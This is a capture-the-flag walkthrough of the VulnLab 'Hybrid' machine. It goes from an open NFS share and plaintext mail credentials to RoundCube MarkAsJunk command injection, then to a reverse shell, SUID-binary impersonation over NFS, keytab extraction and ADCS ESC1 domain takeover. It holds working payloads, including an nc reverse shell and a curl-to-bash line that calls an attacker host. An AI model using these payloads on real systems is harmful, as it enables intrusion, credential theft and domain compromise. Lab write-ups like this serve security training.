---
icon: binary
cover: ../../.gitbook/assets/uwp4968982.jpeg
coverY: 0
---

# VL-HYBRID

### Reconnaissance & Enumeration

#### Initial Port Scanning

First, we'll perform comprehensive port scanning to identify all open services:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/HYBRID]  
└─$ sudo nmap  -T4 10.10.211.137 - balh balh 
```

**Expected Results for mail01.hybrid.vl (10.10.211.137):**

```
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
587/tcp   open  submission
993/tcp   open  imaps
995/tcp   open  pop3s
2049/tcp  open  nfs
```

**Key Services Identified:**

* **SSH (22):** Remote access, potential lateral movement
* **Mail Services (25, 110, 143, 587, 993, 995):** Email infrastructure
* **HTTP (80):** Web interface (likely RoundCube webmail)
* **RPC/NFS (111, 2049):** Network File System - **HIGH PRIORITY TARGET**

#### DNS & Host Discovery

Add domain to hosts file:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/HYBRID]  
└─$ sudo echo "10.10.211.137 mail01.hybrid.vl hybrid.vl" >> /etc/hosts
```

Perform DNS enumeration to discover the Domain Controller:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/HYBRID]  
└─$ nslookup hybrid.vl 10.10.211.137
```

Scan the DC (if discovered via DNS or documentation):

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/HYBRID]  
└─$ sudo nmap -sS -sV -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 <DC_IP> -oN nmap_dc.txt
```

***

### Initial Foothold - NFS Exploitation

#### NFS Misconfiguration Discovery

Network File System (NFS) allows remote file sharing over a network. Misconfigurations occur when:

* Shares are exported with wildcard permissions (`*`)
* No authentication is required
* Sensitive files are accessible

**Enumeration:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/HYBRID]  
└─$ showmount -e 10.10.211.137
```

**Expected Output:**

```
Export list for 10.10.211.137:
/opt/share *
```

**Critical Finding:** The `/opt/share` directory is accessible to EVERYONE (`*` means any host can mount it).

#### Mounting the NFS Share

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/HYBRID]  
└─$ mkdir /tmp/hybrid

┌──(sn0x㉿sn0x)-[~/VulnLab/HYBRID]  
└─$ sudo mount -t nfs 10.10.211.137:/opt/share /tmp/hybrid -o nolock
```

**Explanation:**

* `-t nfs`: Specify NFS file system type
* `-o nolock`: Disable file locking (useful for compatibility)

#### Data Exfiltration

List the mounted share:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/HYBRID]  
└─$ ls -la /tmp/hybrid
```

**Discovery:**

```
total 8
drwxr-xr-x 2 root root 4096 Nov 21 20:00 .
drwxrwxrwt 10 root root 4096 Nov 21 20:01 ..
-rw-r--r-- 1 root root 2847 Nov 21 20:00 backup.tar.gz
```

Extract the backup:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/HYBRID]  
└─$ cp /tmp/hybrid/backup.tar.gz .

┌──(sn0x㉿sn0x)-[~/VulnLab/HYBRID]  
└─$ tar -xvzf backup.tar.gz
```

**Files Extracted:**

```
etc/passwd
etc/sssd/sssd.conf
etc/dovecot/dovecot-users
etc/postfix/main.cf
opt/certs/hybrid.vl/fullchain.pem
opt/certs/hybrid.vl/privkey.pem
```

#### Credential Discovery

Examine the Dovecot users file:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/HYBRID]  
└─$ cat etc/dovecot/dovecot-users
```

**Credentials Found:**

```
admin@hybrid.vl:{plain}Duckling21
peter.turner@hybrid.vl:{plain}PeterIstToll!
```

**Why This Works:** Dovecot stores email account credentials. The `{plain}` prefix indicates passwords are stored in plaintext (major security flaw).

***

### Web Application Exploitation - RoundCube Command Injection

#### RoundCube Login

Access the webmail interface:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/HYBRID]  
└─$ firefox http://10.10.211.137 &
```

**Login with:**

* Username: `peter.turner@hybrid.vl`
* Password: `PeterIstToll!`

#### Vulnerability Identification

**Finding:** An email in the inbox mentions the installation of the **MarkAsJunk** plugin, which is vulnerable to **Command Injection**.

**What is Command Injection?**

Command injection occurs when user input is passed directly to system commands without proper sanitization. The MarkAsJunk plugin uses the username field in system commands, allowing attackers to inject malicious commands.

#### &#x20;Exploitation Setup

**Create Reverse Shell Payload**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/HYBRID]  
└─$ cat > revshell << 'EOF'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.23 8787 >/tmp/f
EOF
```

**Payload Explanation:**

* `rm /tmp/f`: Remove any existing named pipe
* `mkfifo /tmp/f`: Create a named pipe (FIFO)
* `cat /tmp/f|bash -i 2>&1|nc 10.10.14.23 8787 >/tmp/f`:
  * Read from pipe → Execute in bash → Redirect stdout/stderr to netcat → Write back to pipe
  * Creates an interactive reverse shell

**Start HTTP Server**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/HYBRID]  
└─$ php -S 0.0.0.0:80 -t .
```

&#x20;**Start Netcat Listener**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/HYBRID]  
└─$ nc -lnvp 8787
```

#### Command Injection Execution

**In RoundCube:**

1. Go to **Settings** → **Identities**
2. Modify the **Email** field to:

```
peter.turner&curl${IFS}10.10.14.23/revshell${IFS}|${IFS}bash&@hybrid.vl
```

**Payload Breakdown:**

* `peter.turner&`: Original username + command separator
* `curl${IFS}10.10.14.23/revshell`: Download the payload
  * `${IFS}`: Internal Field Separator (bash variable = space) - bypasses space filters
* `${IFS}|${IFS}bash`: Pipe to bash for execution
* `&@hybrid.vl`: Close the injection and complete the email format

3. Save the identity
4. Mark any email as **Junk**

**What Triggers the Exploit:**

When you mark an email as junk, the MarkAsJunk plugin executes a system command like:

```bash
/usr/bin/sa-learn --spam --username=peter.turner&curl${IFS}...
```

The `&` breaks out of the command, allowing arbitrary code execution as the `www-data` user.

#### Shell Received

```bash
┌──(sn0x㉿sn0x)-[~/HTB/HYBRID]  
└─$ nc -lnvp 8787                       
listening on [any] 8787 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.211.137] 49634
bash: cannot set terminal process group (645): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mail01:~/roundcube$
```

**Stabilize the shell:**

```bash
www-data@mail01:~/roundcube$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@mail01:~/roundcube$ export TERM=xterm
# Press Ctrl+Z
stty raw -echo; fg
# Press Enter twice
www-data@mail01:~/roundcube$ stty rows 38 columns 116
```

***

### Privilege Escalation - NFS User Impersonation

#### User Discovery

```bash
www-data@mail01:~/roundcube$ ls -la /home/
total 12
drwxr-xr-x  3 root                       root                       4096 Jun 17  2023 .
drwxr-xr-x 18 root                       root                       4096 Jun 17  2023 ..
drwx------  5 peter.turner@hybrid.vl     domain users@hybrid.vl     4096 Nov 21 21:00 peter.turner@hybrid.vl
```

**Key Observation:** User `peter.turner@hybrid.vl` exists but is NOT in `/etc/passwd`:

```bash
www-data@mail01:~/roundcube$ cat /etc/passwd | grep peter
# No output
```

**This indicates:** The user is authenticated via **SSSD** (System Security Services Daemon) against the Active Directory domain.

#### Extract User IDs

```bash
www-data@mail01:~/roundcube$ id peter.turner@hybrid.vl
uid=902601108(peter.turner@hybrid.vl) gid=902600513(domain users@hybrid.vl) groups=902600513(domain users@hybrid.vl),902601104(hybridusers@hybrid.vl)
```

**Critical Information:**

* **UID:** 902601108
* **GID:** 902600513

#### NFS User Impersonation Attack

**How NFS Permissions Work:**

NFS determines file access based on **UID/GID**, not usernames. If we create a local user with the same UID/GID, we can access files as if we were that user.

**Attack Steps:**

**On Attacker Machine:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/HYBRID]  
└─$ sudo useradd -u 902601108 peter.turner@hybrid.vl
[sudo] password for sn0x: 
useradd warning: peter.turner@hybrid.vl's uid 902601108 outside of the UID_MIN 1000 and UID_MAX 60000 range.

┌──(sn0x㉿sn0x)-[~/VulnLab/HYBRID]  
└─$ sudo groupmod -g 902600513 peter.turner@hybrid.vl

┌──(sn0x㉿sn0x)-[~/VulnLab/HYBRID]  
└─$ id peter.turner@hybrid.vl
uid=902601108(peter.turner@hybrid.vl) gid=902600513(peter.turner@hybrid.vl) groups=902600513(peter.turner@hybrid.vl)
```

#### SUID Binary Injection

**The Attack:** We'll place a SUID bash binary in the NFS share that `www-data` can execute to gain `peter.turner@hybrid.vl` privileges.

**Copy bash binary**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/HYBRID]  
└─$ cp /bin/bash /tmp/bash
```

**Clean the NFS share (from victim shell)**

```bash
www-data@mail01:~/roundcube$ rm /opt/share/bash 2>/dev/null
```

**Place SUID bash (from attacker as peter.turner)**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/HYBRID]  
└─$ sudo su - peter.turner@hybrid.vl -s /bin/bash
[sudo] password for sn0x:

$ cp /tmp/bash /tmp/hybrid/bash

$ chmod ug+s /tmp/hybrid/bash

$ ls -la /tmp/hybrid/bash
-rwsr-sr-x 1 peter.turner@hybrid.vl peter.turner@hybrid.vl 1396520 Nov 21 21:26 /tmp/hybrid/bash
```

**Explanation:**

* `chmod ug+s`: Sets SUID and SGID bits
* When executed, the binary runs with the owner's permissions (peter.turner@hybrid.vl)

#### Privilege Escalation Execution

**From victim shell:**

```bash
www-data@mail01:~/roundcube$ /opt/share/bash -p
bash-5.1$ id
uid=33(www-data) gid=33(www-data) euid=902601108(peter.turner@hybrid.vl) egid=902600513(domain users@hybrid.vl) groups=902600513(domain users@hybrid.vl),33(www-data)
```

**Success!** We now have **effective UID** (euid) of peter.turner@hybrid.vl.

#### SSH Access Establishment

**Generate SSH key (if needed):**

```bash
bash-5.1$ mkdir -p /home/peter.turner\@hybrid.vl/.ssh

bash-5.1$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL1Co3RhkUmbuYTppEh7POqbDWkiKtUcOSuQQbdMzZur sn0x@sn0x" > /home/peter.turner@hybrid.vl/.ssh/authorized_keys

bash-5.1$ chmod 700 /home/peter.turner@hybrid.vl/.ssh
bash-5.1$ chmod 600 /home/peter.turner@hybrid.vl/.ssh/authorized_keys
```

**Or generate new key pair:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/HYBRID]  
└─$ ssh-keygen -t ed25519 -f hybrid_key
```

Then inject the public key as shown above.

**Connect via SSH:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/HYBRID]  
└─$ ssh -i hybrid_key peter.turner@hybrid.vl@10.10.211.137
```

```bash
peter.turner@hybrid.vl@mail01:~$ cat flag.txt
VL{CENSORED}
```

***

### Further Privilege Escalation - KeePass Credential Extraction

#### KeePass Database Discovery

```bash
peter.turner@hybrid.vl@mail01:~$ ls -la
total 44
drwx------ 5 peter.turner@hybrid.vl domain users@hybrid.vl 4096 Nov 21 21:45 .
drwxr-xr-x 3 root                   root                   4096 Jun 17  2023 ..
-rw------- 1 peter.turner@hybrid.vl domain users@hybrid.vl  220 Jun 17  2023 .bash_logout
-rw------- 1 peter.turner@hybrid.vl domain users@hybrid.vl 3526 Jun 17  2023 .bashrc
drwx------ 2 peter.turner@hybrid.vl domain users@hybrid.vl 4096 Nov 21 21:45 .ssh
-rw------- 1 peter.turner@hybrid.vl domain users@hybrid.vl   36 Jun 17  2023 flag.txt
-rw------- 1 peter.turner@hybrid.vl domain users@hybrid.vl 1678 Jun 17  2023 passwords.kdbx
```

**Download the database:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/HYBRID]  
└─$ scp -i hybrid_key peter.turner@hybrid.vl@10.10.211.137:/home/peter.turner@hybrid.vl/passwords.kdbx .
passwords.kdbx                                                100% 1678    18.4KB/s   00:00
```

#### KeePass Database Analysis

**What is KeePass?**

KeePass is a password manager that stores credentials in an encrypted database (.kdbx file). It requires a master password to unlock.

**Attempt to open with discovered password:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/HYBRID]  
└─$ keepassxc passwords.kdbx
```

**Or use CLI:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/HYBRID]  
└─$ keepass2 passwords.kdbx
```

**Master Password:** `PeterIstToll!` (the same password we found earlier)

**Credentials Discovered Inside:**

```
Username: peter.turner@hybrid.vl
Password: b0cwR+G4Dzl_rw
```

This appears to be a stronger, domain-level password.

#### Root Access via Sudo

```bash
peter.turner@hybrid.vl@mail01:~$ sudo -l
[sudo] password for peter.turner@hybrid.vl: b0cwR+G4Dzl_rw
Matching Defaults entries for peter.turner@hybrid.vl on mail01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter.turner@hybrid.vl may run the following commands on mail01:
    (ALL : ALL) ALL
```

**Escalate to root:**

```bash
peter.turner@hybrid.vl@mail01:~$ sudo su
[sudo] password for peter.turner@hybrid.vl: b0cwR+G4Dzl_rw
root@mail01:/home/peter.turner@hybrid.vl#
```

**Get Root Flag:**

```bash
root@mail01:~# cat flag.txt
VL{CENSORED}
```

***

### Domain Compromise - Active Directory Certificate Services Attack

#### Certificate Template Enumeration

**What is ADCS ESC1?**

Active Directory Certificate Services (ADCS) allows issuing certificates for authentication. **ESC1** is a vulnerability where:

1. Certificate templates allow **Subject Alternative Name (SAN)** specification
2. The template is enabled for **Client Authentication**
3. Low-privileged users can enroll

**This allows impersonation of ANY domain user, including Domain Admins.**

**Enumerate vulnerable templates:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/HYBRID]  
└─$ certipy-ad find -u peter.turner -p 'b0cwR+G4Dzl_rw' -dc-ip <DC_IP> -vulnerable -enabled -stdout
```

**Expected Finding:**

```
Certificate Templates
  0
    Template Name                       : HybridComputers
    Display Name                        : HybridComputers
    Certificate Authorities             : hybrid-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True    <-- VULNERABLE!
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 100 years
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HYBRID.VL\Domain Computers
    [!] Vulnerabilities
      ESC1                              : 'HYBRID.VL\\Domain Computers' can enroll
```

**🚨 Critical Finding:** The `HybridComputers` template is vulnerable to ESC1, but only **Domain Computers** can enroll, not regular users.

#### Kerberos Credential Extraction

**The Problem:** We need computer account credentials to exploit ESC1.

**The Solution:** Extract the Kerberos keytab file from the Linux domain-joined machine.

**What is a Keytab?**

A keytab file (`krb5.keytab`) stores Kerberos principal credentials for services. On domain-joined Linux machines, it contains the machine account's credentials.

**Extract the keytab:**

```bash
root@mail01:~# cp /etc/krb5.keytab /tmp/krb5.keytab
root@mail01:~# chmod 644 /tmp/krb5.keytab
```

**Download to attacker machine:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/HYBRID]  
└─$ scp -i hybrid_key peter.turner@hybrid.vl@10.10.211.137:/tmp/krb5.keytab .
krb5.keytab                                                   100% 194     2.1KB/s   00:00
```

#### Keytab Decryption

**Download extraction script:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/HYBRID]  
└─$ wget https://raw.githubusercontent.com/sosdave/KeyTabExtract/master/keytabextract.py
```

**Extract credentials:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/HYBRID]  
└─$ python3 keytabextract.py krb5.keytab
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : HYBRID.VL
        SERVICE PRINCIPAL : MAIL01$/
        NTLM HASH : 0f916c5246fdbc7ba95dcef4126d57bd
        AES-256 HASH : eac6b4f4639b96af4f6fc2368570cde71e9841f2b3e3402350d3b6272e436d6e
        AES-128 HASH : 3a732454c95bcef529167b6bea476458
```

**Machine Account Credentials:**

* **Service Principal:** `MAIL01$@HYBRID.VL`
* **NTLM Hash:** `0f916c5246fdbc7ba95dcef4126d57bd`

#### Certificate Request for Administrator

**Request a certificate for the Administrator account using the machine credentials:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/HYBRID]  
└─$ certipy-ad req -dc-ip <DC_IP> -ca 'hybrid-DC01-CA' -target hybrid.vl -template HybridComputers -upn 'administrator@HYBRID.VL' -dns dc01.hybrid.vl -u 'MAIL01$@HYBRID.VL' -hashes '0f916c5246fdbc7ba95dcef4126d57bd' -key-size 4096
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 8
[*] Got certificate with multiple identifications
    UPN: 'administrator@HYBRID.VL'
    DNS Host Name: 'dc01.hybrid.vl'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_dc01.pfx'
```

**Parameters Explained:**

* `-ca`: Certificate Authority name
* `-target`: Domain name
* `-template`: Vulnerable template name
* `-upn`: User Principal Name we want to impersonate (Administrator)
* `-dns`: DNS name to include in certificate
* `-u`: Service principal (machine account)
* `-hashes`: NTLM hash of machine account
* `-key-size 4096`: Required by template

**Why This Works:**

The certificate template allows us to specify:

1. **UPN** (User Principal Name): We specify `administrator@HYBRID.VL`
2. **DNS Name**: We add `dc01.hybrid.vl` for versatility

The certificate is signed by the trusted CA, making it valid for authentication AS the Administrator.

#### Administrator Password Change via LDAP

**Authenticate with the certificate and change Administrator password:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/HYBRID]  
└─$ certipy-ad auth -pfx administrator_dc01.pfx -username Administrator -domain hybrid.vl -dc-ip <DC_IP> -ldap-shell
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Connecting to 'ldaps://<DC_IP>:636'
[*] Authenticated to '<DC_IP>' as: u:HYBRID\Administrator
Type help for list of commands

# change_password Administrator 'Passw0rd123!@#'
Got User DN: CN=Administrator,CN=Users,DC=hybrid,DC=vl
Attempting to set new password of: Passw0rd123!@#
Password changed successfully!
```

**What Just Happened:**

Using the certificate, we authenticated as Administrator over LDAPS (LDAP over SSL) and changed the account's password. We now have full Domain Admin credentials.

***

### Domain Admin Access

#### Evil-WinRM Connection

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/HYBRID]  
└─$ evil-winrm -i <DC_IP> -u Administrator -p 'Passw0rd123!@#'

Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

#### Get Domain Admin Flag

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop

*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir

    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/17/2023   7:32 AM             36 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
VL{xxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

***

### Attack Flow

```
1. NFS Misconfiguration
   ↓
2. Credential Discovery (dovecot-users)
   ↓
3. RoundCube Command Injection (MarkAsJunk plugin)
   ↓
4. Initial Foothold (www-data shell)
   ↓
5. NFS User Impersonation (SUID binary)
   ↓
6. SSH Access (peter.turner@hybrid.vl)
   ↓
7. KeePass Database Extraction
   ↓
8. Root Access (sudo with discovered password)
   ↓
9. Kerberos Keytab Extraction (machine account credentials)
   ↓
10. ESC1 Certificate Template Abuse
    ↓
11. Administrator Certificate Request
    ↓
12. LDAP Password Change
    ↓
13. Domain Admin Access (Evil-WinRM)
```

***

